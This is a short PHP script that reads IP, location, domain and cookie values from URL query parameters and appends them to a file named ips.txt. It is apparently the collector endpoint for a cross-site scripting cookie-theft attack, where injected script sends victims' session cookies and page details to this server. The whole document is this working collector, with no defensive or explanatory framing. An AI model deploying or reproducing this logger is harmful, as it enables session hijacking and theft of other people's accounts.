<?php
$file = 'ips.txt';
// Open the file to get existing content
$current = file_get_contents($file);
// Append a new person to the file
$current .= "Ip: " . htmlspecialchars($_GET["id"]) . " location: " . htmlspecialchars($_GET["location"]) . " domain: " . htmlspecialchars($_GET["domain"]) . " cookie: " . htmlspecialchars($_GET["cookie"]). PHP_EOL;
// Write the contents back to the file
file_put_contents($file, $current);
?>
